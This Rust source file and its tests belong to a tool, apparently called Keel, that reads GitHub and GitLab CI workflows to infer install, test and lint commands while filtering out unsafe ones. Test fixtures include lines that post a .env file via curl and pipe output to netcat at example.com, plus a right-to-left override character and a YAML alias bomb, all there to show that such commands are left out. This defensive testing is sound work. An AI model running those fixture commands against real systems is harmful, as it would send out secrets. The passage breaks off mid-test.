//! For a project whose files say nothing Keel recognizes: what its CI already runs to install and to
//! test. For one whose files do: what else its CI checks, like a linter or a type checker. A workflow
//! is the project's own script, so this only reads it, and what's taken from it is for a person to
//! confirm like any other guess.

use std::collections::HashSet;
use std::path::Path;

use serde_yaml_ng::Value;

use super::{CHECKS, MOST_OPTIONS, NOT_CHECKS, calls, file_names, is_dir, read, yaml};

/// A repo decides how many workflows it has.
const MOST_WORKFLOWS: usize = 12;
/// More than a person reads at a glance before saving it.
const LONGEST_COMMAND: usize = 200;
/// Runners and linters whose names don't say they check something.
const RUNNERS: [&str; 16] = [
    "pytest", "rspec", "phpunit", "jest", "vitest", "mocha", "tox", "nox", "ctest", "unittest",
    "mypy", "pyright", "flake8", "eslint", "clippy", "ruff",
];
/// `ruff format` rewrites the code, and `ruff format --check` only checks it.
const FORMATS: [&str; 2] = ["fmt", "format"];
/// `uv sync`, `go mod download` or `pip install pytest` install, even when they name a runner.
const INSTALLS: [&str; 7] = [
    "install", "sync", "restore", "fetch", "download", "get", "resolve",
];
/// What only makes sense on CI's own machine: the system's packages, containers, git, and what
/// reports back to CI.
const CI_ONLY: [&str; 14] = [
    "sudo", "apt", "apt-get", "brew", "choco", "yum", "dnf", "apk", "curl", "wget", "docker",
    "git", "echo", "printf",
];
/// A line that starts with one of these only means something with the lines around it.
const SPANS_LINES: [&str; 16] = [
    "if", "then", "else", "elif", "fi", "for", "while", "until", "do", "done", "case", "esac",
    "function", "select", "{", "}",
];
/// After one of these, the next line runs in another folder.
const MOVES: [&str; 3] = ["cd", "pushd", "popd"];

/// Jobs, each with its commands in the order they run.
type Jobs = Vec<Vec<String>>;

#[derive(Default)]
pub(super) struct Found {
    pub setup: Vec<String>,
    pub check: Vec<String>,
    pub from: Vec<String>,
}

#[derive(PartialEq)]
enum Kind {
    Checks,
    Prepares,
    /// Never ends, or changes the code.
    Neither,
}

impl Found {
    /// A job counts if it tests something. What it runs before its last test prepares for it, and
    /// what comes after, like reports, uploads and deploys, is left out.
    fn add(&mut self, job: &[String]) -> bool {
        let kinds: Vec<Kind> = job.iter().map(|command| kind(command)).collect();
        let Some(last) = kinds.iter().rposition(|kind| *kind == Kind::Checks) else {
            return false;
        };
        for (at, command) in job.iter().enumerate() {
            let list = match kinds[at] {
                Kind::Checks => &mut self.check,
                Kind::Prepares if at < last => &mut self.setup,
                _ => continue,
            };
            if list.len() < MOST_OPTIONS && !list.contains(command) {
                list.push(command.clone());
            }
        }
        true
    }
}

/// What the CI checks that `check` doesn't run yet, in the order it runs it.
#[derive(Default)]
pub(super) struct Missing {
    /// As Keel runs them with no network.
    pub add: Vec<String>,
    /// As the CI runs them, since Keel doesn't know how to run them with no network.
    pub left_out: Vec<String>,
    /// The files they're in.
    pub from: Vec<String>,
}

/// Each simple command of each line is judged on its own, so `ruff check . && curl …` gives only
/// `ruff check .`. Two that run the same tool in the same mode are one, and a script or a Makefile
/// target counts as what it runs.
pub(super) fn missing_from(root: &Path, check: &str) -> Missing {
    let mut repo = calls::Repo::read(root);
    let mut checked = repo.checked(check);
    let mut left_out_sigs = HashSet::new();
    let mut missing = Missing::default();
    for (file, jobs) in github(root).into_iter().chain(gitlab(root)) {
        let mut used = false;
        for line in jobs.iter().flatten() {
            for command in calls::simple_commands(line) {
                if !runs_here(command) || kind(command) != Kind::Checks {
                    continue;
                }
                let sigs = repo.sigs(command);
                if calls::is_checked(&checked, &sigs) {
                    continue;
                }
                used = true;
                if let Some(form) = repo.offline(command) {
                    checked.extend(repo.sigs(&form));
                    if missing.add.len() < MOST_OPTIONS {
                        missing.add.push(form);
                    }
                    continue;
                }
                let new = sigs
                    .first()
                    .is_none_or(|own| left_out_sigs.insert(own.clone()));
                if new
                    && missing.left_out.len() < MOST_OPTIONS
                    && !missing.left_out.iter().any(|known| known == command)
                {
                    missing.left_out.push(command.to_owned());
                }
            }
        }
        if used {
            missing.from.push(file);
        }
    }
    missing
}

/// GitHub's workflows, then GitLab's pipeline. A command that several jobs run is there once.
pub(super) fn commands(root: &Path) -> Found {
    let mut found = Found::default();
    for (file, jobs) in github(root).into_iter().chain(gitlab(root)) {
        let mut used = false;
        for job in &jobs {
            used |= found.add(job);
        }
        if used {
            found.from.push(file);
        }
    }
    found
}

/// Jobs that run on Windows are left out, and so are steps in another shell or another folder.
fn github(root: &Path) -> Vec<(String, Jobs)> {
    // Real folders, so a link can't send this to read somewhere else.
    if !is_dir(root, ".github") || !is_dir(root, ".github/workflows") {
        return Vec::new();
    }
    file_names(&root.join(".github/workflows"))
        .into_iter()
        .filter(|name| name.ends_with(".yml") || name.ends_with(".yaml"))
        .take(MOST_WORKFLOWS)
        .filter_map(|name| {
            let file = format!(".github/workflows/{name}");
            let workflow = yaml(&read(root, &file)?)?;
            let jobs = workflow["jobs"]
                .as_mapping()?
                .values()
                .filter(|job| {
                    here(&workflow["defaults"]["run"])
                        && here(&job["defaults"]["run"])
                        && !on_windows(&job["runs-on"])
                })
                .map(|job| {
                    job["steps"]
                        .as_sequence()
                        .into_iter()
                        .flatten()
                        .filter(|step| here(step))
                        .filter_map(|step| step["run"].as_str())
                        .flat_map(lines)
                        .collect()
                })
                .collect();
            Some((file, jobs))
        })
        .collect()
}

/// A step, or the defaults for a job's steps, in bash or sh and in the project's own folder.
fn here(settings: &Value) -> bool {
    settings.get("working-directory").is_none()
        && settings["shell"]
            .as_str()
            .is_none_or(|shell| ["bash", "sh"].contains(&shell))
}

fn on_windows(runs_on: &Value) -> bool {
    let windows = |label: &str| label.to_ascii_lowercase().contains("windows");
    runs_on.as_str().is_some_and(windows)
        || runs_on
            .as_sequence()
            .into_iter()
            .flatten()
            .filter_map(Value::as_str)
            .any(windows)
}

/// A job is any entry with a `script`, except a hidden one, whose name starts with a dot. Its own
/// `before_script` replaces the one in `default`.
fn gitlab(root: &Path) -> Option<(String, Jobs)> {
    let file = ".gitlab-ci.yml";
    let pipeline = yaml(&read(root, file)?)?;
    let before = match pipeline["default"].get("before_script") {
        Some(before) => before,
        None => &pipeline["before_script"],
    };
    let jobs = pipeline
        .as_mapping()?
        .iter()
        .filter(|(name, job)| {
            name.as_str().is_some_and(|name| !name.starts_with('.')) && job.get("script").is_some()
        })
        .map(|(_, job)| {
            let before = job.get("before_script").unwrap_or(before);
            scripts(before)
                .chain(scripts(&job["script"]))
                .flat_map(lines)
                .collect()
        })
        .collect();
    Some((file.to_owned(), jobs))
}

/// A script is a line or a list of them.
fn scripts(script: &Value) -> impl Iterator<Item = &str> {
    script.as_str().into_iter().chain(
        script
            .as_sequence()
            .into_iter()
            .flatten()
            .filter_map(Value::as_str),
    )
}

/// The commands in a script, a line each, as its shell runs them: each has to pass for the next to
/// run, so they chain with `&&`. A script that moves to another folder, or whose lines only mean
/// something together, is left out whole, and so is each line that only runs on CI.
fn lines(script: &str) -> Vec<String> {
    let mut commands = Vec::new();
    let mut current = String::new();
    for line in script.lines().map(str::trim) {
        if current.is_empty() && (line.is_empty() || line.starts_with('#')) {
            continue;
        }
        // A line that ends in `\`, `&&` or `|` goes on in the next one.
        if let Some(start) = line.strip_suffix('\\') {
            current.push_str(start.trim_end());
            current.push(' ');
        } else if line.ends_with("&&") || line.ends_with('|') {
            current.push_str(line);
            current.push(' ');
        } else {
            current.push_str(line);
            commands.push(std::mem::take(&mut current).trim().to_owned());
        }
    }
    if !current.trim().is_empty() {
        commands.push(current.trim().to_owned());
    }
    let together = commands.iter().any(|command| {
        command.contains("<<")
            || command.ends_with('{')
            || command
                .split_whitespace()
                .next()
                .is_some_and(|first| SPANS_LINES.contains(&first))
            || command.split_whitespace().any(|word| MOVES.contains(&word))
    });
    if together {
        return Vec::new();
    }
    commands
        .into_iter()
        .filter(|command| runs_here(command))
        // `a; b` or `a || b` chained with `&&` would change what has to pass.
        .map(|command| {
            if command.contains(';') || command.contains("||") {
                format!("({command})")
            } else {
                command
            }
        })
        .collect()
}

/// What runs on this Mac as it ran on CI: nothing for GitHub to fill in, none of CI's own
/// variables, nothing left running in the background, and only characters that show as they are.
fn runs_here(command: &str) -> bool {
    let first = command.split_whitespace().next().unwrap_or_default();
    command.len() <= LONGEST_COMMAND
        && command.chars().all(|c| c == ' ' || c.is_ascii_graphic())
        && !["${{", "$GITHUB_", "${GITHUB_", "$CI_", "${CI_"]
            .iter()
            .any(|only| command.contains(only))
        && !CI_ONLY.contains(&first)
        && !(command.ends_with('&') && !command.ends_with("&&"))
}

/// A command checks if it tests or lints. One that installs prepares, even when it names a runner.
fn kind(command: &str) -> Kind {
    // `--fix`, `test:watch` or `deps.get`, but not `test_get.py`, which is a file, nor
    // `--watch=false`.
    let words: Vec<String> = command
        .split(|c: char| c.is_whitespace() || ":.".contains(c))
        .map(|word| word.trim_start_matches('-').to_ascii_lowercase())
        .collect();
    let installs = words.iter().any(|word| INSTALLS.contains(&word.as_str()))
        || words.windows(2).any(|pair| pair == ["npm", "ci"]);
    // A formatter rewrites the code, unless it's told only to check it: `--check`,
    // `--check-formatted`, `--verify-no-changes` or `--diff`.
    let rewrites = words.iter().any(|word| FORMATS.contains(&word.as_str()))
        && !words
            .iter()
            .any(|word| word.starts_with("check") || word.starts_with("verify") || word == "diff");
    // `run-tests.sh` or `vendor/bin/phpunit`.
    let checks = command
        .split(|c: char| c.is_whitespace() || ":-_./=()".contains(c))
        .map(str::to_ascii_lowercase)
        .any(|part| CHECKS.contains(&part.as_str()) || RUNNERS.contains(&part.as_str()));
    if rewrites || words.iter().any(|word| NOT_CHECKS.contains(&word.as_str())) {
        Kind::Neither
    } else if checks && !installs {
        Kind::Checks
    } else {
        Kind::Prepares
    }
}

#[cfg(test)]
mod tests {
    use crate::detect::tests::{both, found, repo};
    use crate::detect::{CiGap, Guess, LARGEST_FILE, MOST_OPTIONS, ci_gap, guess};

    const WORKFLOW: &str = "\
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: mlugg/setup-zig@v2
      - run: zig fetch
      - name: Build
        run: zig build
      - run: zig build test
      - run: echo done >> \"$GITHUB_STEP_SUMMARY\"
      - run: zig build release
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: zig build install
      - run: ./deploy.sh
";

    #[test]
    fn an_unknown_stack_gets_what_its_ci_installs_and_tests_with() {
        let guess =
            guess(repo(&[("build.zig", ""), (".github/workflows/ci.yml", WORKFLOW)]).path());
        assert_eq!(
            guess,
            Guess {
                // What comes after the tests, and a job that tests nothing, are left out.
                setup: Some("zig fetch && zig build".to_owned()),
                check: Some("zig build test".to_owned()),
                from: vec![".github/workflows/ci.yml".to_owned()],
                from_ci: true,
                ..Guess::default()
            }
        );
    }

    #[test]
    fn what_a_project_says_wins_over_its_ci() {
        let guess =
            guess(repo(&[("Cargo.toml", ""), (".github/workflows/ci.yml", WORKFLOW)]).path());
        assert_eq!(guess.check.as_deref(), Some("cargo test"));
        assert!(!guess.from_ci);
        assert_eq!(
            found(&[
                ("Makefile", "test:\n\ttrue\n"),
                (".github/workflows/ci.yml", WORKFLOW)
            ]),
            (Some("make test".to_owned()), None)
        );
    }

    #[test]
    fn a_ci_that_tests_nothing_gets_nothing() {
        let build_only = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm install\n      - run: npm run build\n";
        assert_eq!(
            guess(repo(&[(".github/workflows/build.yml", build_only)]).path()),
            Guess::default()
        );
        for broken in ["not: [yaml", "", "jobs: 3", "- a\n- b\n"] {
            assert_eq!(
                guess(repo(&[(".github/workflows/ci.yml", broken)]).path()),
                Guess::default(),
                "{broken}"
            );
        }
    }

    #[test]
    fn jobs_that_install_the_same_way_install_once() {
        let workflow = "\
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: npm ci
      - run: npm run lint
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm ci
      - run: npm run test:watch
      - run: pip install pytest
      - run: npm test -- --watch=false
      - run: pytest tests/test_get_debug.py
";
        assert_eq!(
            found(&[
                ("package.json", "{}"),
                (".github/workflows/ci.yaml", workflow)
            ]),
            both(
                "npm run lint && npm test -- --watch=false && pytest tests/test_get_debug.py",
                // What never ends isn't a check, nor does it prepare one.
                "npm ci && pip install pytest"
            )
        );
    }

    #[test]
    fn what_only_runs_on_ci_is_left_out() {
        let workflow = r#"
jobs:
  windows:
    runs-on: windows-latest
    steps:
      - run: ./test.ps1
  test:
    runs-on: ubuntu-latest
    steps:
      - run: sudo apt-get install -y libfoo-dev
      - run: pip install -r requirements.txt
      - run: ./build.sh ${{ matrix.target }}
      - run: cd docs && make test
      - working-directory: web
        run: npm test
      - shell: pwsh
        run: Invoke-Pester -Tag test
      - run: |
          if [ -f extra ]; then
            make test-extra
          fi
      - run: |
          # Comments go.
          ./build.sh \
            --release
          ./run-tests.sh || true
      - run: ./serve.sh &
      - run: ./e2e-test.sh
      - run: pytest HIDDEN
      - run: ./slow-test.sh LONG
"#
        // A character that turns what's shown around.
        .replace("HIDDEN", "\u{202e}")
        .replace("LONG", &"x".repeat(300));
        assert_eq!(
            found(&[(".github/workflows/ci.yml", &workflow)]),
            both(
                "(./run-tests.sh || true) && ./e2e-test.sh",
                "pip install -r requirements.txt && ./build.sh --release"
            )
        );
    }

    #[test]
    fn lines_that_go_on_in_the_next_one_are_one_command() {
        let workflow = "jobs:\n  t:\n    steps:\n      - run: |\n          ./configure &&\n          make\n      - run: make test\n";
        assert_eq!(
            found(&[(".github/workflows/ci.yml", workflow)]),
            both("make test", "./configure && make")
        );
    }

    #[test]
    fn gitlab_ci_is_read_too() {
        let pipeline = "\
stages: [test]
default:
  before_script:
    - ./configure
job:test:
  stage: test
  script:
    - make
    - make check
.template:
  script:
    - make check-hidden
pages:
  before_script: []
  script: make docs
";
        let guess = guess(repo(&[(".gitlab-ci.yml", pipeline)]).path());
        assert_eq!(guess.setup.as_deref(), Some("./configure && make"));
        assert_eq!(guess.check.as_deref(), Some("make check"));
        assert_eq!(guess.from, [".gitlab-ci.yml"]);
        assert!(guess.from_ci);
    }

    #[test]
    fn a_file_with_aliases_is_not_read() {
        // A few lines of them can repeat an anchor into more than fits in memory.
        let workflow = "x: &tests ./run-tests.sh\njobs:\n  t:\n    steps:\n      - run: *tests\n";
        assert_eq!(
            guess(repo(&[(".github/workflows/ci.yml", workflow)]).path()),
            Guess::default()
        );
        // A star that isn't one doesn't count.
        let workflow = "on:\n  schedule:\n    - cron: '*/15 * * * *'\njobs:\n  t:\n    steps:\n      - run: rm -f build/* && ./run-tests.sh\n";
        assert_eq!(
            found(&[(".github/workflows/ci.yml", workflow)]).0,
            Some("rm -f build/* && ./run-tests.sh".to_owned())
        );
    }

    const ONE_TEST: &str = "jobs:\n  t:\n    steps:\n      - run: ./run-tests.sh\n";

    #[test]
    fn links_and_huge_files_are_not_read() {
        let outside = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(outside.path().join("workflows")).unwrap();
        std::fs::write(outside.path().join("workflows/ci.yml"), ONE_TEST).unwrap();

        let dir = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path(), dir.path().join(".github")).unwrap();
        assert_eq!(guess(dir.path()), Guess::default());

        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".github")).unwrap();
        std::os::unix::fs::symlink(
            outside.path().join("workflows"),
            dir.path().join(".github/workflows"),
        )
        .unwrap();
        assert_eq!(guess(dir.path()), Guess::default());

        let dir = repo(&[(".github/workflows/other.yml", "")]);
        std::os::unix::fs::symlink(
            outside.path().join("workflows/ci.yml"),
            dir.path().join(".github/workflows/ci.yml"),
        )
        .unwrap();
        assert_eq!(guess(dir.path()), Guess::default());

        let huge = format!("{ONE_TEST}{}", "#\n".repeat(LARGEST_FILE as usize));
        assert_eq!(
            guess(repo(&[(".github/workflows/ci.yml", &huge)]).path()),
            Guess::default()
        );
    }

    #[test]
    fn a_repo_cannot_flood_it_with_workflows_or_commands() {
        let workflows: Vec<(String, String)> = (0..30)
            .map(|n| {
                (
                    format!(".github/workflows/w{n:02}.yml"),
                    format!("jobs:\n  t:\n    steps:\n      - run: ./test-{n}.sh\n"),
                )
            })
            .collect();
        let files: Vec<(&str, &str)> = workflows
            .iter()
            .map(|(name, text)| (name.as_str(), text.as_str()))
            .collect();
        let guess = guess(repo(&files).path());
        assert_eq!(guess.from.len(), super::MOST_WORKFLOWS);
        assert_eq!(guess.from[0], ".github/workflows/w00.yml");

        let steps: String = (0..30)
            .map(|n| format!("      - run: ./test-{n}.sh\n"))
            .collect();
        let workflow = format!("jobs:\n  t:\n    steps:\n{steps}");
        let check = found(&[(".github/workflows/ci.yml", &workflow)]).0.unwrap();
        assert_eq!(check.split(" && ").count(), MOST_OPTIONS);
    }

    const PYTHON_CI: &str = "\
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: uv sync --frozen
      - run: uv run ruff check .
      - run: uv run ruff format --check .
      - run: uv run pyright
  test:
    runs-on: ubuntu-latest
    steps:
      - run: uv sync --frozen
      - run: uv run ruff format .
      - run: uv run pytest -x tests/
";

    /// A lock with these packages in it, as uv and poetry write one.
    fn lock(names: &[&str]) -> String {
        names
            .iter()
            .map(|name| format!("[[package]]\nname = \"{name}\"\nversion = \"1.0\"\n\n"))
            .collect()
    }

    fn strings(list: &[&str]) -> Vec<String> {
        list.iter().map(|item| (*item).to_owned()).collect()
    }

    /// A `pyproject.toml` whose `dev` group, which `uv sync` installs by default, has these.
    fn dev_group(names: &[&str]) -> String {
        let names: Vec<String> = names.iter().map(|name| format!("\"{name}\"")).collect();
        format!("[dependency-groups]\ndev = [{}]\n", names.join(", "))
    }

    const CI_FILE: &str = ".github/workflows/ci.yml";

    #[test]
    fn a_known_stack_also_gets_the_linters_and_type_checks_its_ci_runs_as_it_runs_them_offline() {
        let guess = guess(
            repo(&[
                ("uv.lock", &lock(&["pytest", "ruff", "pyright"])),
                ("pyproject.toml", &dev_group(&["pytest", "ruff", "pyright"])),
                (CI_FILE, PYTHON_CI),
            ])
            .path(),
        );
        assert_eq!(
            guess,
            Guess {
                setup: Some("uv sync --frozen".to_owned()),
                // Its own check first. pytest is already there, and a formatter that rewrites files
                // checks nothing. With no network to compare the lock with, uv is told not to.
                check: Some(
                    "uv run --frozen pytest && uv run --frozen ruff check . \
                     && uv run --frozen ruff format --check . && uv run --frozen pyright"
                        .to_owned()
                ),
                from: vec!["uv.lock".to_owned(), ".github/workflows/ci.yml".to_owned()],
                ci_checks: strings(&[
                    "uv run --frozen ruff check .",
                    "uv run --frozen ruff format --check .",
                    "uv run --frozen pyright",
                ]),
                ..Guess::default()
            }
        );
    }

    #[test]
    fn a_tool_the_setup_does_not_install_is_left_out_and_said() {
        // pytest isn't in the lock, so `uv sync` doesn't install it: CI installs it on its own.
        let workflow = "jobs:\n  t:\n    steps:\n      - run: uv sync --frozen\n      - run: uv pip install pytest\n      - run: uv run pytest\n";
        let guess = guess(
            repo(&[
                ("uv.lock", &lock(&["requests"])),
                (".github/workflows/ci.yml", workflow),
            ])
            .path(),
        );
        assert_eq!(guess.setup.as_deref(), Some("uv sync --frozen"));
        assert_eq!(guess.check, None, "uv only claims a runner it can see");
        assert!(guess.ci_checks.is_empty());
        assert_eq!(guess.ci_left_out, ["uv run pytest"]);
    }

    #[test]
    fn a_tool_only_in_a_group_the_setup_leaves_out_is_left_out() {
        let workflow = "jobs:\n  t:\n    steps:\n      - run: uv run ruff check .\n";
        let only_lint = "[dependency-groups]\ndev = [\"pytest\"]\nlint = [\"ruff\"]\n";
        let gap = |pyproject: &str| {
            let dir = repo(&[
                ("uv.lock", &lock(&["pytest", "ruff"])),
                ("pyproject.toml", pyproject),
                (CI_FILE, workflow),
            ]);
            ci_gap(dir.path(), "uv run --frozen pytest")
        };
        let lint_aside = gap(only_lint);
        assert!(lint_aside.commands.is_empty());
        assert_eq!(lint_aside.left_out, ["uv run ruff check ."]);
        let lint_too = gap(&format!(
            "{only_lint}[tool.uv]\ndefault-groups = [\"dev\", \"lint\"]\n"
        ));
        assert_eq!(lint_too.commands, ["uv run --frozen ruff check ."]);

        // Poetry installs every group that isn't optional.
        let poetry = |optional: &str| {
            let pyproject = format!(
                "[tool.poetry.dependencies]\npython = \"^3.12\"\n[tool.poetry.group.lint]\noptional = {optional}\n[tool.poetry.group.lint.dependencies]\nruff = \"*\"\n"
            );
            let dir = repo(&[
                ("poetry.lock", &lock(&["ruff"])),
                ("pyproject.toml", &pyproject),
                (CI_FILE, workflow),
            ]);
            ci_gap(dir.path(), "poetry run pytest")
        };
        assert_eq!(poetry("false").commands, ["poetry run ruff check ."]);
        assert_eq!(poetry("true").left_out, ["uv run ruff check ."]);
    }

    #[test]
    fn only_checks_on_the_list_are_proposed_and_the_rest_is_left_out() {
        let package = r#"{"scripts":{"test":"vitest run","lint":"eslint .","test:e2e":"playwright test","verify":"pnpm lint && vercel deploy --prod"},
            "devDependencies":{"vitest":"1","eslint":"9","typescript":"5","@playwright/test":"1"}}"#;
        let workflow = "\
jobs:
  t:
    steps:
      - run: pnpm install --frozen-lockfile
      - run: pnpm lint
      - run: npx tsc --noEmit
      - run: pnpm test
      - run: pnpm test:e2e
      - run: npx playwright test
      - run: semgrep ci
      - run: terraform validate
      - run: npx biome check .
      - run: pnpm run verify
";
        let node = guess(
            repo(&[
                ("package.json", package),
                ("pnpm-lock.yaml", ""),
                (CI_FILE, workflow),
            ])
            .path(),
        );
        assert_eq!(
            node.check.as_deref(),
            Some("pnpm test && node_modules/.bin/tsc --noEmit")
        );
        assert_eq!(node.ci_checks, ["node_modules/.bin/tsc --noEmit"]);
        // A script can run anything, and Biome isn't one of its packages.
        assert_eq!(
            node.ci_left_out,
            [
                "pnpm lint",
                "pnpm test:e2e",
                "npx playwright test",
                "semgrep ci",
                "terraform validate",
                "npx biome check .",
                "pnpm run verify",
            ]
        );

        // Installed isn't enough: these reach the network.
        let workflow = "jobs:\n  t:\n    steps:\n      - run: uv run danger ci\n      - run: uv run markdown-link-check README.md\n      - run: uv run safety check\n      - run: uv run alembic check\n";
        let tools = ["danger", "markdown-link-check", "safety", "alembic"];
        let python = guess(
            repo(&[
                ("uv.lock", &lock(&tools)),
                ("pyproject.toml", &dev_group(&tools)),
                (CI_FILE, workflow),
            ])
            .path(),
        );
        assert!(python.ci_checks.is_empty());
        assert_eq!(python.ci_left_out.len(), 4, "{:?}", python.ci_left_out);

        let workflow = "jobs:\n  t:\n    steps:\n      - run: cargo +nightly fmt --check\n      - run: cargo audit\n      - run: cargo test\n";
        let rust =
            guess(repo(&[("Cargo.toml", ""), (".github/workflows/ci.yml", workflow)]).path());
        assert_eq!(rust.check.as_deref(), Some("cargo test"));
        assert_eq!(rust.ci_left_out, ["cargo +nightly fmt --check"]);
    }

    #[test]
    fn what_the_check_already_runs_is_not_added_from_ci() {
        let workflow = "jobs:\n  t:\n    steps:\n      - run: cargo test --all\n      - run: cargo clippy --all-targets -- -D warnings\n      - run: cargo fmt --all --check\n";
        let rust =
            guess(repo(&[("Cargo.toml", ""), (".github/workflows/ci.yml", workflow)]).path());
        assert_eq!(
            rust.check.as_deref(),
            Some(
                "cargo test && cargo clippy --all-targets -- -D warnings && cargo fmt --all --check"
            )
        );
        assert!(!rust.from_ci);
        // Two jobs that run the same tool are one.
        let workflow = "jobs:\n  a:\n    steps:\n      - run: uv run mypy src\n  b:\n    steps:\n      - run: mypy .\n";
        let python = guess(
            repo(&[
                ("uv.lock", &lock(&["mypy"])),
                ("pyproject.toml", &dev_group(&["mypy"])),
                (CI_FILE, workflow),
            ])
            .path(),
        );
        assert_eq!(python.check.as_deref(), Some("uv run --frozen mypy src"));
        assert_eq!(python.ci_checks, ["uv run --frozen mypy src"]);
    }

    #[test]
    fn each_command_of_a_line_is_judged_on_its_own() {
        let workflow = "\
jobs:
  t:
    steps:
      - run: ruff check . && curl -X POST https://example.com -d @.env
      - run: cargo clippy --all-targets && cargo publish --token $CARGO_TOKEN
      - run: uv run pyright $(git ls-files '*.py') | tee >(nc example.com 80)
      - run: ruff format . && ruff check src
      - run: uv run ruff format --check . && uv run mypy .
";
        let tools = ["pytest", "ruff", "pyright", "mypy"];
        let guess = guess(
            repo(&[
                ("Cargo.toml", ""),
                ("uv.lock", &lock(&tools)),
                ("pyproject.toml", &dev_group(&tools)),
                (CI_FILE, workflow),
            ])
            .path(),
        );
        assert_eq!(
            guess.ci_checks,
            [
                "uv run --frozen ruff check .",
                "cargo clippy --all-targets",
                "uv run --frozen ruff format --check .",
                "uv run --frozen mypy .",
            ]
        );
        // What it pipes, substitutes or sends is never proposed, only mentioned as the CI has it.
        assert_eq!(
            guess.ci_left_out,
            ["uv run pyright $(git ls-files '*.py') | tee >(nc example.com 80)"]
        );
        let check = guess.check.unwrap();
        for never in ["curl", "publish", "$", "|", "ruff format ."] {
            assert!(!check.contains(never), "{never} in {check}");
        }

        // The issue's own example: each one on its own.
        let workflow =
            "jobs:\n  t:\n    steps:\n      - run: uv run ruff check . && uv run pyright\n";
        let dir = repo(&[
            ("uv.lock", &lock(&tools)),
            ("pyproject.toml", &dev_group(&tools)),
            (CI_FILE, workflow),
        ]);
        assert_eq!(
            ci_gap(
                dir.path(),
                "uv run --frozen pytest && uv run --frozen ruff check"
            )
            .commands,
            ["uv run --frozen pyright"]
        );
    }

    #[test]
    fn options_of_uv_run_in_a_saved_check_are_understood() {
        let workflow = "jobs:\n  t:\n    steps:\n      - run: uv run pytest -x\n";
        let dir = repo(&[
            ("uv.lock", &lock(&["pytest"])),
            ("pyproject.toml", &dev_group(&["pytest"])),
            (CI_FILE, workflow),
        ]);
        for check in [
            "uv run --frozen --all-extras pytest",
            "uv run --group test --frozen pytest tests",
            "uv run --python=3.12 python -m pytest",
        ] {
            assert_eq!(ci_gap(dir.path(), check), CiGap::default(), "{check}");
        }
    }

    #[test]
    fn a_makefile_that_runs_itself_cannot_hold_it_up() {
        let mut makefile = String::from("test:\n");
        makefile.push_str(&"\tmake test\n".repeat(500));
        makefile.push_str("lint:\n");
        makefile.push_str(&"\tmake lint\n".repeat(500));
        let workflow = "jobs:\n  t:\n    steps:\n      - run: make lint\n      - run: make test\n";
        let dir = repo(&[("Makefile", &makefile), (CI_FILE, workflow)]);
        let started = std::time::Instant::now();
        let guess = guess(dir.path());
        let gap = ci_gap(dir.path(), "make test");
        assert!(
            started.elapsed() < std::time::Duration::from_secs(1),
            "{:?}",
            started.elapsed()
        );
        assert_eq!(guess.check.as_deref(), Some("make test"));
        assert_eq!(gap.left_out, ["make lint"]);
    }

    #[test]
    fn a_tool_counts_as_checked_only_in_the_same_mode() {
        let workflow = "\
jobs:
  t:
    steps:
      - run: ruff format --check .
      - run: ruff check .
      - run: black --check .
      - run: isort --check-only .
      - run: npx prettier --check .
      - run: npm test
";
        let tools = ["ruff", "black", "isort"];
        let dir = repo(&[
            ("uv.lock", &lock(&tools)),
            ("pyproject.toml", &dev_group(&tools)),
            (
                "package.json",
                r#"{"scripts":{"test":"jest"},"devDependencies":{"jest":"29","prettier":"3"}}"#,
            ),
            ("package-lock.json", "{}"),
            (CI_FILE, workflow),
        ]);
        let gap = ci_gap(
            dir.path(),
            "uv run --frozen ruff check && cargo test && go test ./...",
        );
        assert_eq!(
            gap.commands,
            [
                "uv run --frozen ruff format --check .",
                "uv run --frozen black --check .",
                "uv run --frozen isort --check-only .",
                "node_modules/.bin/prettier --check .",
            ]
        );
        // Neither cargo's nor go's tests are npm's.
        assert_eq!(gap.left_out, ["npm test"]);
    }

    #[test]
    fn a_script_or_a_make_target_counts_as_what_it_runs() {
        // npm test is jest, so CI's own jest is already in the check.
        let package = r#"{"scripts":{"test":"jest"},"devDependencies":{"jest":"29"}}"#;
        let workflow =
            "jobs:\n  t:\n    steps:\n      - run: npm ci\n      - run: npx jest --ci --coverage\n";
        let dir = repo(&[
            ("package.json", package),
            ("package-lock.json", "{}"),
            (".github/workflows/ci.yml", workflow),
        ]);
        let node = guess(dir.path());
        assert_eq!(node.check.as_deref(), Some("npm test"));
        assert!(node.ci_checks.is_empty() && node.ci_left_out.is_empty());
        // And CI's script is what a check that runs jest itself already runs.
        let workflow = "jobs:\n  t:\n    steps:\n      - run: npm test\n";
        let dir = repo(&[
            ("package.json", package),
            ("package-lock.json", "{}"),
            (".github/workflows/ci.yml", workflow),
        ]);
        assert_eq!(ci_gap(dir.path(), "npx jest"), CiGap::default());

        let makefile = "test:\n\t@uv run pytest -q\nlint:\n\tuv run ruff check .\n";
        let workflow = "jobs:\n  t:\n    steps:\n      - run: uv run pytest\n      - run: uv run ruff check .\n";
        let make = guess(
            repo(&[
                ("Makefile", makefile),
                ("uv.lock", &lock(&["pytest", "ruff"])),
                ("pyproject.toml", &dev_group(&["pytest", "ruff"])),
                (CI_FILE, workflow),
            ])
            .path(),
        );
        assert_eq!(
            make.check.as_deref(),
            Some("make test && uv run --frozen ruff check .")
        );
    }

    #[test]
    fn formatters_told_only_to_check_are_checks() {
        let workflow = "jobs:\n  t:\n    steps:\n      - run: mix format --check-formatted\n      - run: mix test\n";
        let mix = guess(repo(&[("mix.exs", ""), (".github/workflows/ci.yml", workflow)]).path());
        assert_eq!(
            mix.check.as_deref(),
            Some("mix test && mix format --check-formatted")
        );
        let workflow =
            "jobs:\n  t:\n    steps:\n      - run: dotnet format app.sln --verify-no-changes\n";
        let dotnet = guess(repo(&[("app.sln", ""), (".github/workflows/ci.yml", workflow)]).path());
        assert_eq!(
            dotnet.ci_checks,
            ["dotnet format app.sln --verify-no-changes"]
        );
    }

    #[test]
    fn a_known_stack_without_ci_is_guessed_as_before() {
        let guess = guess(repo(&[("uv.lock", "name = \"pytest\"")]).path());
